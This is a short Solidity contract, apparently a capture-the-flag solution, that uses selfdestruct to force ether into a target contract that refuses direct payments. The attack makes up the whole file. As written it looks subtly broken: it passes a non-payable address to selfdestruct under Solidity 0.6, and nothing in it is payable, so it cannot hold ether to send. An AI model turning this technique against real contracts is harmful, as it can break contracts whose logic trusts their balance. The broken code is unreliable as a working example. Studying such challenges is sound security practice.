// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract HackForce {
  address forceAddress;

  constructor(address _forceAddress) public {
    forceAddress = _forceAddress;
  }

  function forceSend() external {
    selfdestruct(forceAddress);
  }
}
